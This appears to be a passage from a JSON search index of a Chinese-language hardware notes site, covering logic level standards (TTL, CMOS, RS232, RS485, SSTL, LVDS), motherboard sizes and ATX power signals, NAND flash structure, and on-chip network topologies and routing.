\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u89c2\u5bdf\u200b\u662f\u200b\u6b63\u200b\u7684\u200b\u8fd8\u662f\u200b\u53cd\u200b\u7684\u200b\uff0c\u200b\u7136\u540e\u200b\u6839\u636e\u200b\u63a5\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u627e\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u4fe1\u53f7\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u903b\u8f91\u200b\u6b63\u786e\u6027\u200b\uff0c\u200b\u540c\u65f6\u200b\u4f7f\u7528\u200b\u4e0d\u540c\u200b\u7684\u200b slave \u200b\u5730\u5740\u200b\u3002</p>"},{"location":"hardware/logic_levels.html","title":"\u903b\u8f91\u200b\u7535\u5e73\u200b\u6807\u51c6","text":"<p>\u200b\u903b\u8f91\u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e0d\u540c\u200b\u82af\u7247\u200b\u4e4b\u95f4\u200b\uff0c\u200b\u5982\u4f55\u200b\u628a\u200b\u6570\u5b57\u4fe1\u53f7\u200b 0 \u200b\u6216\u8005\u200b 1 \u200b\u8f6c\u5316\u200b\u4e3a\u200b\u9ad8\u200b\u4f4e\u7535\u5e73\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5982\u4f55\u200b\u628a\u200b\u9ad8\u200b\u4f4e\u7535\u5e73\u200b\u8f6c\u6362\u200b\u56de\u200b 0 \u200b\u6216\u8005\u200b 1\u3002</p> <p>\u200b\u9996\u5148\u200b\u662f\u200b\u8f93\u51fa\u200b\uff0c\u200b\u8981\u200b\u628a\u200b 0 \u200b\u6216\u8005\u200b 1 \u200b\u8f6c\u5316\u200b\u4e3a\u200b\u9ad8\u200b\u4f4e\u7535\u5e73\u200b\uff0c\u200b\u4e8e\u662f\u200b\u5c31\u8981\u200b\u5b9a\u4e49\u200b\u8303\u56f4\u200b\uff1a</p> <ul> <li>\u200b\u8f93\u51fa\u200b 0\uff1a\u200b\u7535\u538b\u200b\u6700\u9ad8\u200b\u662f\u200b \\(V_{OL}\\)\uff0cOutput Low Voltage</li> <li>\u200b\u8f93\u51fa\u200b 1\uff1a\u200b\u7535\u538b\u200b\u6700\u4f4e\u200b\u662f\u200b \\(V_{OH}\\)\uff0cOutput High Voltage</li> </ul> <p>\u200b\u53cd\u8fc7\u6765\u200b\uff0c\u200b\u8981\u200b\u628a\u200b\u7535\u5e73\u200b\u8f6c\u6362\u200b\u5230\u200b 0 \u200b\u6216\u8005\u200b 1 \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u8981\u200b\u5b9a\u4e49\u200b\u8303\u56f4\u200b\uff1a</p> <ul> <li>\u200b\u5982\u679c\u200b\u7535\u538b\u200b\u9ad8\u4e8e\u200b \\(V_{IH}\\)\uff0c\u200b\u5c31\u200b\u8ba4\u4e3a\u200b\u662f\u200b 1</li> <li>\u200b\u5982\u679c\u200b\u7535\u538b\u200b\u4f4e\u4e8e\u200b \\(V_{IL}\\)\uff0c\u200b\u5c31\u200b\u8ba4\u4e3a\u200b\u662f\u200b 0</li> </ul> <p>\u200b\u901a\u5e38\u200b\uff0c\u200b\u4e0a\u9762\u200b\u56db\u9879\u200b\u6ee1\u8db3\u200b \\(V_{OL} &lt; V_{IL} &lt; V_{IH} &lt; V_{OH}\\)\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u8f93\u5165\u200b\u4f1a\u200b\u6bd4\u200b\u8f93\u51fa\u200b\u7684\u200b\u8303\u56f4\u200b\u66f4\u5927\u200b\uff0c\u200b\u66f4\u52a0\u200b\u5bbd\u5bb9\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u4e00\u5b9a\u200b\u7684\u200b\u5bb9\u9519\u200b\u3002</p>"},{"location":"hardware/logic_levels.html#ttl","title":"TTL \u200b\u7535\u5e73","text":"<p>\u200b\u5e38\u89c1\u200b\u7684\u200b 5V TTL \u200b\u7535\u5e73\u200b\uff0c\u200b\u4ee5\u200b https://learn.sparkfun.com/tutorials/logic-levels/ttl-logic-levels \u200b\u7684\u200b\u6570\u636e\u200b\u4e3a\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u7535\u5e73\u200b\u8303\u56f4\u200b\u662f\u200b\uff1a</p> <ul> <li>\u200b\u8f93\u51fa\u200b 0: \\(V_{OL}=0.4\\), \\([0, 0.4]\\mathrm{V}\\)</li> <li>\u200b\u8f93\u51fa\u200b 1: \\(V_{OH}=2.7\\), \\([2.7, 5]\\mathrm{V}\\)</li> <li>\u200b\u8f93\u5165\u200b 0: \\(V_{IL}=0.8\\), \\([0, 0.8]\\mathrm{V}\\)</li> <li>\u200b\u8f93\u5165\u200b 1: \\(V_{IH}=2.0\\), \\([2, 5]\\mathrm{V}\\)</li> </ul> <p>Wikipedia \u200b\u4e0a\u200b\u7684\u200b\u6570\u636e\u200b\u4e2d\u200b \\(V_{OH}=2.4\\)\u3002</p> <p>FT232H \u200b\u82af\u7247\u200b\u652f\u6301\u200b TTL\uff0c\u200b\u53c2\u6570\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>\\(V_{OL}=0.4\\), \\(V_{OH}=2.4\\)</li> <li>\\(V_{IL}=0.8\\), \\(V_{OL}=2.0\\)</li> </ul>"},{"location":"hardware/logic_levels.html#cmos","title":"CMOS \u200b\u7535\u5e73","text":"<p>\u200b\u73b0\u5728\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u662f\u200b CMOS \u200b\u7535\u5e73\u200b\u3002\u200b\u4ee5\u200b Artix-7 FPGAs \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5b83\u200b\u652f\u6301\u200b\u591a\u79cd\u200b CMOS \u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\uff1a</p> <ul> <li>LVCMOS12: \\(V_{OL}=0.4, V_{OH}=V_{CCO}-0.4, V_{IL}=0.35V_{CCO}, V_{IH}=0.65V_{CCO}\\)</li> <li>LVCMOS15: \\(V_{OL}=0.25V_{CCO}, V_{OH}=0.75V_{CCO}, V_{IL}=0.35V_{CCO}, V_{IH}=0.65V_{CCO}\\)</li> <li>LVCMOS18: \\(V_{OL}=0.45, V_{OH}=V_{CCO}-0.45, V_{IL}=0.35V_{CCO}, V_{IH}=0.65V_{CCO}\\)</li> <li>LVCMOS25: \\(V_{OL}=0.4, V_{OH}=V_{CCO}-0.4, V_{IL}=0.7, V_{IH}=1.7\\)</li> <li>LVCMOS33: \\(V_{OL}=0.4, V_{OH}=V_{CCO}-0.4, V_{IL}=0.8, V_{IH}=2.0\\)</li> </ul> <p>\u200b\u5176\u4e2d\u200b \\(V_{CCO}\\) \u200b\u662f\u200b\u5916\u90e8\u200b\u8f93\u5165\u200b\u7684\u200b\u7535\u538b\u200b\uff0c\u200b\u4e0e\u200b LVCMOS \u200b\u540e\u9762\u200b\u7684\u200b\u4e24\u4f4d\u200b\u6570\u5b57\u200b\u5339\u914d\u200b\uff0cLVCMOS33 \u200b\u5c31\u200b\u5bf9\u5e94\u200b 3.3 V\u3002\u200b\u6bcf\u4e2a\u200b Bank \u200b\u90fd\u200b\u6709\u200b\u76f8\u540c\u200b\u7684\u200b \\(V_{CCO}\\) \u200b\u7535\u538b\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b\u4e3a\u4ec0\u4e48\u200b\u5728\u200b\u7ea6\u675f\u200b\u6587\u4ef6\u200b\u91cc\u200b\u8981\u200b\u5199\u200b IOSTANDARD\uff0c\u200b\u5e76\u4e14\u200b\u7ecf\u5e38\u200b\u8fde\u7eed\u200b\u7684\u200b\u4fe1\u53f7\u200b\u90fd\u200b\u4f7f\u7528\u200b\u540c\u6837\u200b\u7684\u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\u3002</p> <p>\u200b\u4e00\u4e9b\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cTTL \u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\u548c\u200b CMOS \u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\u662f\u200b\u53ef\u4ee5\u200b\u517c\u5bb9\u200b\u7684\u200b\uff0c\u200b\u53ea\u8981\u200b\u5b83\u4eec\u200b\u7684\u200b\u7535\u538b\u200b\u8303\u56f4\u200b\u6ee1\u8db3\u8981\u6c42\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u63a5\u53d7\u200b\u8f83\u200b\u9ad8\u200b\u7684\u200b\u8f93\u5165\u200b\u7535\u538b\u200b\u3002\u200b\u8be6\u89c1\u200b Can I Use 3.3V TTL to Trigger a 3.3V CMOS Device \u200b\u548c\u200b Logic Guide - Texas Instruments\uff1a</p> <p> </p> \u200b\u4e0d\u540c\u200b TTL \u200b\u548c\u200b CMOS \u200b\u7535\u5e73\u200b\u7684\u200b\u517c\u5bb9\u6027\u200b\uff08\u200b\u56fe\u6e90\u200b Logic Guide - Texas Instruments\uff09"},{"location":"hardware/logic_levels.html#rs232","title":"RS232","text":"<p>RS232 \u200b\u6bd4\u8f83\u200b\u7279\u522b\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u7535\u5e73\u200b\u6709\u200b\u6b63\u200b\u6709\u200b\u8d1f\u200b\uff1a</p> <ul> <li>\u200b\u8f93\u51fa\u200b 0: \\([-15, -5] \\mathrm{V}\\)</li> <li>\u200b\u8f93\u51fa\u200b 1: \\([5, 15] \\mathrm{V}\\)</li> <li>\u200b\u8f93\u5165\u200b 0: \\([-15, -3] \\mathrm{V}\\)</li> <li>\u200b\u8f93\u5165\u200b 1: \\([3, 15] \\mathrm{V}\\)</li> </ul> <p>\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u63a5\u200b RS232 \u200b\u5916\u8bbe\u200b\u5230\u200b FPGA \u200b\u4e0a\u200b\uff0c\u200b\u901a\u5e38\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u7535\u5e73\u200b\u8f6c\u6362\u200b\uff08\u200b\u4f8b\u5982\u200b MAX3232 3-V to 5.5-V Multichannel RS-232 Line Driver and Receiver With \u00b115-kV ESD Protection\uff09\uff0c\u200b\u5426\u5219\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\u3002</p>"},{"location":"hardware/logic_levels.html#rs485","title":"RS485","text":"<p>RS485 \u200b\u901a\u8fc7\u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u6765\u200b\u4f20\u8f93\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u7528\u200b\u4e00\u5bf9\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff0c\u200b\u4ee5\u200b\u4e8c\u8005\u200b\u7684\u200b\u5dee\u503c\u200b\u6765\u200b\u8868\u793a\u200b\u6570\u5b57\u4fe1\u53f7\u200b\u7684\u200b 0 \u200b\u6216\u8005\u200b 1\u3002\u200b\u5b83\u200b\u8981\u6c42\u200b\uff0c\u200b\u6570\u5b57\u200b 1 \u200b\u5bf9\u5e94\u200b\u5dee\u5206\u200b\u7535\u538b\u200b \\(V_{a} - V_{b} \\le -200 \\mathrm{mV}\\)\uff0c\u200b\u6570\u5b57\u200b 0 \u200b\u5bf9\u5e94\u200b\u5dee\u5206\u200b\u7535\u538b\u200b \\(V_{a} - V_{b} \\ge +200 \\mathrm{mV}\\)\uff0c\u200b\u6ce2\u5f62\u200b\u5982\u4e0b\u200b\uff1a</p>"},{"location":"hardware/logic_levels.html#sstl","title":"SSTL","text":"<p>SSTL(Stub Series Terminated Logic) \u200b\u662f\u200b SDRAM \u200b\u6240\u200b\u91c7\u7528\u200b\u7684\u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\uff0c\u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u7248\u672c\u200b\uff1a</p> <ul> <li>SSTL_15</li> <li>SSTL_18: \\(V_{DDQ} = 1.8 \\mathrm{V}\\), \\(V_{REF} = 0.9 \\mathrm{V}\\)</li> <li>SSTL_2: \\(V_{DDQ} = 2.5 \\mathrm{V}\\), \\(V_{REF} = 1.25 \\mathrm{V}\\)</li> <li>SSTL_3: $V_{DDQ} = 3.3 \\mathrm{V}, \\(V_{REF} = 1.5 \\mathrm{V}\\)</li> </ul> <p>SSTL \u200b\u8fd8\u6709\u200b\u5dee\u5206\u200b\u7248\u672c\u200b\uff0c\u200b\u7528\u4e8e\u200b\u4f20\u8f93\u200b CK\u3001DQS \u200b\u7b49\u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u3002</p>"},{"location":"hardware/logic_levels.html#lvds","title":"LVDS","text":"<p>LVDS(Low Voltage Differential Signaling) \u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\u3002\u200b\u7531\u4e8e\u200b\u662f\u200b\u5dee\u5206\u200b\u4f20\u8f93\u200b\uff0c\u200b\u5c31\u200b\u6709\u5171\u6a21\u200b\u7535\u538b\u200b\u548c\u200b\u5dee\u6a21\u200b\u7535\u538b\u200b\u3002\u200b\u4f8b\u5982\u200b LVDS_25 \u200b\u7684\u200b\u5171\u6a21\u200b\u7535\u538b\u200b\u662f\u200b \\(1.2 \\mathrm{V}\\)\uff0c\u200b\u5dee\u6a21\u200b\u7535\u538b\u200b\u662f\u200b \\(0.45 \\mathrm{V}\\)\uff0c\u200b\u610f\u5473\u7740\u200b\u4e24\u4e2a\u200b\u6570\u636e\u4fe1\u53f7\u200b\u4e0a\u200b\u7684\u200b\u7535\u538b\u200b\u4f1a\u200b\u5206\u522b\u200b\u5728\u200b \\(1.2-0.45/2 = 0.975 \\mathrm{V}\\) \u200b\u548c\u200b \\(1.2+0.45/2 = 1.425 \\mathrm{V}\\) \u200b\u4e0a\u4e0b\u200b\u3002</p> <p>TMDS \u200b\u548c\u200b LVDS \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4f46\u662f\u200b\u7535\u538b\u200b\u4e0d\u200b\u4e00\u6837\u200b\u3002TMDS \u200b\u7ecf\u5e38\u200b\u7528\u4e8e\u200b DVI \u200b\u548c\u200b HDMI \u200b\u7684\u200b\u4fe1\u53f7\u200b\u4f20\u8f93\u200b\u3002</p>"},{"location":"hardware/motherboard.html","title":"\u4e3b\u677f","text":""},{"location":"hardware/motherboard.html#_2","title":"\u5c3a\u5bf8","text":"<p>\u200b\u53c2\u8003\u200b https://en.wikipedia.org/wiki/DTX_(form_factor) https://www.silverstonetek.com/en/tech-talk/wh11_008 https://en.wikipedia.org/wiki/ATX\uff1a</p> <ul> <li>Ultra ATX: 366mm x 244mm</li> <li>SSI MEB: 441mm x 330mm</li> <li>EATX(Extended ATX): 305mm x 330mm, 305mm x 257mm, 305mm x 264mm, 305mm x 267mm, 305mm x 272mm</li> <li>ATX: 305mm x 244mm</li> <li>mATX(microATX): 244mm x 244mm</li> <li>DTX: 203mm x 244mm</li> <li>miniDTX: 203mm x 170mm</li> <li>miniITX: 170mm x 170mm</li> </ul>"},{"location":"hardware/motherboard.html#_3","title":"\u4f9b\u7535","text":"<p>ATX \u200b\u5e38\u89c1\u200b\u4f9b\u7535\u200b\u63a5\u53e3\u200b\u662f\u200b 24pin\uff0820+4pin\uff09\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b +3.3V\uff0c+5V\uff0c+12V \u200b\u548c\u200b -12V\u3002\u200b\u9664\u4e86\u200b\u7535\u548c\u5730\u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4fe1\u53f7\u7ebf\u200b\uff1a</p> <ul> <li>PS_ON#\uff1apower supply on\uff0c\u200b\u4e3b\u677f\u200b\u901a\u8fc7\u200b\u62c9\u4f4e\u200b PS_ON# \u200b\u8ba9\u200b\u7535\u6e90\u200b\u542f\u52a8\u200b\uff1b\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7279\u6b8a\u200b\u7684\u200b +5V standby \u200b\u7535\u6e90\u200b\u4e0d\u200b\u53d7\u200b PS_ON# \u200b\u5f71\u54cd\u200b</li> <li>PWR_OK\uff1apower good\uff0c\u200b\u7535\u6e90\u200b\u901a\u77e5\u200b\u4e3b\u677f\u200b\uff0c\u200b\u8f93\u51fa\u200b\u7684\u200b\u7535\u6e90\u200b\u5df2\u7ecf\u200b\u53ef\u7528\u200b</li> </ul>"},{"location":"hardware/nand_flash.html","title":"NAND Flash","text":""},{"location":"hardware/nand_flash.html#_1","title":"\u7ed3\u6784","text":"<p>NAND Flash \u200b\u5206\u200b\u5982\u4e0b\u200b\u5c42\u6b21\u200b\uff1a</p> <ul> <li>Package/Chip</li> <li>Die</li> <li>Plane</li> <li>Block\uff1aErase \u200b\u7684\u200b\u7c92\u5ea6\u200b</li> <li>Page\uff1aProgram/Read \u200b\u7684\u200b\u7c92\u5ea6\u200b</li> </ul> <p>Erase\uff1a\u200b\u628a\u200b\u6574\u4e2a\u200b Block \u200b\u7684\u200b\u6570\u636e\u200b\u5199\u6210\u200b\u5168\u200b 1</p> <p>Program\uff1a\u200b\u628a\u200b Page \u200b\u7684\u200b\u67d0\u4e9b\u200b 1 \u200b\u6539\u5199\u200b\u6210\u200b 0\uff0c\u200b\u4f46\u200b\u4e0d\u80fd\u200b\u628a\u200b 0 \u200b\u6539\u5199\u200b\u6210\u200b 1</p> <p>\u200b\u7269\u7406\u200b\u4e0a\u200b\uff1aErase \u200b\u628a\u200b\u7535\u538b\u200b\u53d8\u6210\u200b\u6700\u4f4e\u200b\uff0c\u200b\u5bf9\u5e94\u200b 1\uff0cProgram \u200b\u628a\u200b\u7535\u538b\u200b\u62ac\u9ad8\u200b\uff0c\u200b\u628a\u200b 1 \u200b\u53d8\u6210\u200b 0\u3002</p> <p>MLC\uff1a2 bit per cell\uff0c\u200b\u6709\u200b\u56db\u79cd\u200b\u7535\u538b\u200b\u3002</p> <p>TLC\uff1a3 bit per cell\uff0c\u200b\u6709\u200b\u516b\u79cd\u200b\u7535\u538b\u200b\u3002</p>"},{"location":"hardware/nand_flash.html#_2","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>Understanding Flash: Blocks, Pages and Program / Erases</li> <li>NAND Flash 101</li> </ul>"},{"location":"hardware/on_chip_networks.html","title":"\u7247\u4e0a\u200b\u7f51\u7edc","text":""},{"location":"hardware/on_chip_networks.html#_2","title":"\u80cc\u666f","text":"<p>\u200b\u968f\u7740\u200b\u82af\u7247\u200b\u5185\u200b\u7684\u200b\u6838\u5fc3\u200b\u6570\u91cf\u200b\u589e\u591a\u200b\uff0c\u200b\u5728\u200b\u5b9e\u73b0\u200b\u4e92\u8054\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f20\u7edf\u200b\u7684\u200b Crossbar \u200b\u9047\u5230\u200b\u4e86\u200b\u6269\u5c55\u6027\u200b\u7684\u200b\u74f6\u9888\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u7528\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u6765\u200b\u66ff\u4ee3\u200b Crossbar\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u4e3b\u8981\u200b\u6309\u7167\u200b On-Chip Networks, Second Edition \u200b\u4ee5\u53ca\u200b\u300a\u200b\u8ba1\u7b97\u673a\u7cfb\u7edf\u200b\u7ed3\u6784\u200b\u300b\u200b\u8bfe\u7a0b\u200b\u548c\u200b\u300a\u200b\u9ad8\u7b49\u200b\u8ba1\u7b97\u673a\u7cfb\u7edf\u200b\u7ed3\u6784\u200b\u300b\u200b\u8bfe\u4ef6\u200b\u7684\u200b\u987a\u5e8f\u200b\u8fdb\u884c\u200b\u8bb2\u89e3\u200b\u3002</p>"},{"location":"hardware/on_chip_networks.html#_3","title":"\u62d3\u6251","text":"<p>\u200b\u62d3\u6251\u200b\u8bb2\u200b\u7684\u200b\u5c31\u662f\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u7684\u200b\u8fde\u63a5\u200b\u65b9\u5f0f\u200b\u3002\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u62d3\u6251\u200b\u6709\u200b\uff1a</p> <ol> <li>Ring\uff1a\u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u8fde\u63a5\u200b\u5230\u200b\u73af\u4e0a\u200b\u76f8\u90bb\u200b\u7684\u200b\u4e24\u4e2a\u200b\u7ed3\u70b9\u200b</li> <li>Mesh\uff1a\u200b\u4ee5\u200b 2D Mesh \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u628a\u200b\u7ed3\u70b9\u200b\u653e\u5728\u200b\u4e00\u4e2a\u200b\u7f51\u683c\u200b\u91cc\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u6700\u200b\u591a\u200b\u8fde\u63a5\u200b\u56db\u4e2a\u200b\u76f8\u90bb\u200b\u7ed3\u70b9\u200b\uff1a\u200b\u5728\u200b\u5185\u90e8\u200b\u7684\u200b\u8fde\u63a5\u200b\u56db\u4e2a\u200b\u76f8\u90bb\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u5728\u200b\u8fb9\u4e0a\u200b\u7684\u200b\u53ea\u200b\u8fde\u63a5\u200b\u4e09\u4e2a\u200b\u76f8\u90bb\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u5728\u200b\u89d2\u4e0a\u200b\u7684\u200b\u53ea\u200b\u8fde\u63a5\u200b\u4e24\u4e2a\u200b\u7ed3\u70b9\u200b</li> <li>Torus\uff1a\u200b\u5728\u200b Mesh \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u8ba9\u200b\u8fb9\u200b\u548c\u200b\u89d2\u4e0a\u200b\u7684\u200b\u7ed3\u70b9\u200b\u4e5f\u200b\u8fde\u63a5\u200b\u56db\u4e2a\u200b\u7ed3\u70b9\u200b\uff1a\u200b\u8fb9\u4e0a\u200b\u7684\u200b\u7ed3\u70b9\u200b\u8fde\u5230\u200b\u5bf9\u4fa7\u200b\u6700\u8fdc\u200b\u7684\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u89d2\u4e0a\u200b\u7684\u200b\u7ed3\u70b9\u200b\u8fde\u200b\u5230\u200b\u53e6\u5916\u200b\u4e24\u4e2a\u200b\u89d2\u200b</li> </ol> <p> </p> Ring\uff0cMesh \u200b\u548c\u200b Torus\uff08\u200b\u56fe\u6e90\u200b On Chip Networks, Second Edition\uff09 <p>\u200b\u5176\u4e2d\u200b Mesh \u200b\u548c\u200b Torus \u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u6269\u5c55\u200b\u5230\u200b\u9ad8\u9636\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4f8b\u5982\u200b 3D \u200b\u7684\u200b\u7acb\u65b9\u4f53\u200b\u3002</p> <p>\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u6bd4\u8f83\u590d\u6742\u200b\u7684\u200b\u7f51\u7edc\u62d3\u6251\u200b\uff0c\u200b\u4f8b\u5982\u200b Fat Tree\uff0c\u200b\u5728\u200b\u6811\u5f62\u200b\u62d3\u6251\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u7531\u4e8e\u200b\u6811\u4e0a\u200b\u4e24\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u8def\u5f84\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u591a\u5730\u200b\u7ecf\u8fc7\u200b\u5c42\u6570\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\u7684\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u4f8b\u5982\u200b\u6839\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u628a\u200b\u9760\u8fd1\u200b\u6839\u200b\u7ed3\u70b9\u200b\u7684\u200b\u8fb9\u200b\u53d8\u7c97\u200b\uff08\u200b\u589e\u52a0\u200b\u5e26\u5bbd\u200b\uff09\uff1a</p> <p> </p> Fat Tree\uff08\u200b\u56fe\u6e90\u200b Wikipedia\uff09 <p>\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u4ee5\u4e0b\u200b\u51e0\u4e2a\u200b\u65b9\u9762\u200b\u8bc4\u4f30\u200b\u4e00\u4e2a\u200b\u62d3\u6251\u200b\u7684\u200b\u5c5e\u6027\u200b\uff1a</p> <ol> <li>\u200b\u7ed3\u70b9\u200b\u7684\u200b\u5ea6\u200b\uff1a\u200b\u8fde\u63a5\u200b\u7684\u200b\u7ed3\u70b9\u200b\u6570\u200b</li> <li>\u200b\u76f4\u5f84\u200b\uff1a\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u8ddd\u79bb\u200b\u7684\u200b\u6700\u5927\u503c\u200b</li> <li>\u200b\u7b49\u200b\u5206\u200b\u5bbd\u5ea6\u200b\uff1a\u200b\u7f51\u7edc\u200b\u88ab\u200b\u5207\u6210\u200b\u4e24\u534a\u200b\uff08\u200b\u6216\u8005\u200b\u51e0\u4e4e\u200b\u4e24\u534a\u200b\uff09\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5207\u5272\u200b\u7684\u200b\u6700\u5c0f\u200b\u8fb9\u6570\u200b</li> </ol> <p>\u200b\u5728\u200b\u8fd9\u200b\u4e09\u79cd\u200b\u62d3\u6251\u200b\u4e2d\u200b\uff0c\u200b\u7ed3\u70b9\u200b\u65e2\u200b\u662f\u200b\u6d41\u91cf\u200b\u7684\u200b\u8d77\u70b9\u200b\u548c\u200b\u7ec8\u70b9\u200b\uff0c\u200b\u53c8\u200b\u8d1f\u8d23\u200b\u4e86\u200b\u6d41\u91cf\u200b\u7684\u200b\u8f6c\u53d1\u200b\u3002</p> <p>\u200b\u53e6\u4e00\u7c7b\u200b\u62d3\u6251\u200b\u4e2d\u200b\uff0c\u200b\u6709\u200b\u90e8\u5206\u200b\u7ed3\u70b9\u200b\u53ea\u200b\u8d1f\u8d23\u200b\u8f6c\u53d1\u200b\u6d41\u91cf\u200b\uff0c\u200b\u4e0d\u200b\u4f5c\u4e3a\u200b\u6d41\u91cf\u200b\u7684\u200b\u8d77\u70b9\u200b\u548c\u200b\u7ec8\u70b9\u200b\uff0c\u200b\u4f8b\u5982\u200b Butterfly \u200b\u7f51\u7edc\u200b\uff0cClos \u200b\u7f51\u7edc\u200b\uff0cFat Tree\u3002</p> <p>\u200b\u4f46\u200b\u7531\u4e8e\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u662f\u200b\u8981\u200b\u5b9e\u73b0\u200b\u5728\u200b\u82af\u7247\u200b\u4e0a\u200b\u7684\u200b\uff0c\u200b\u800c\u200b\u82af\u7247\u200b\u662f\u200b 2D \u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u4e00\u822c\u200b\u4f1a\u200b\u7528\u200b\u53ef\u4ee5\u200b\u653e\u5728\u200b\u5e73\u9762\u200b\u4e0a\u200b\u7684\u200b\u62d3\u6251\u200b\uff0c\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u5c31\u662f\u200b Mesh \u200b\u548c\u200b Ring\u3002</p>"},{"location":"hardware/on_chip_networks.html#_4","title":"\u8def\u7531","text":"<p>\u200b\u786e\u5b9a\u200b\u597d\u200b\u7f51\u7edc\u62d3\u6251\u200b\u540e\u200b\uff0c\u200b\u5728\u200b\u5b9e\u9645\u200b\u4f20\u8f93\u200b\u4e4b\u524d\u200b\uff0c\u200b\u7531\u4e8e\u200b\u4e24\u4e2a\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u8def\u5f84\u200b\u4e0d\u200b\u552f\u4e00\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u5982\u4f55\u200b\u628a\u200b\u8bf7\u6c42\u200b\u4ece\u200b\u8d77\u70b9\u200b\u8def\u7531\u200b\u5230\u200b\u7ec8\u70b9\u200b\u3002\u200b\u8fd9\u91cc\u200b\u4e3b\u8981\u200b\u8003\u8651\u200b\u7684\u200b\u662f\u200b Mesh \u200b\u62d3\u6251\u200b\u7684\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u5bb9\u6613\u200b\u60f3\u5230\u200b\u7684\u200b\u662f\u200b\u9009\u62e9\u200b\u6700\u77ed\u200b\u8def\u5f84\u200b\uff0c\u200b\u4f46\u200b\u5728\u200b Mesh \u200b\u62d3\u6251\u200b\u4e2d\u200b\uff0c\u200b\u6700\u77ed\u200b\u8def\u5f84\u200b\u4e5f\u200b\u662f\u200b\u4e0d\u200b\u552f\u4e00\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u66f4\u52a0\u200b\u5177\u4f53\u200b\u7684\u200b\u7b97\u6cd5\u200b\u6765\u200b\u505a\u51fa\u200b\u9009\u62e9\u200b\u3002</p> 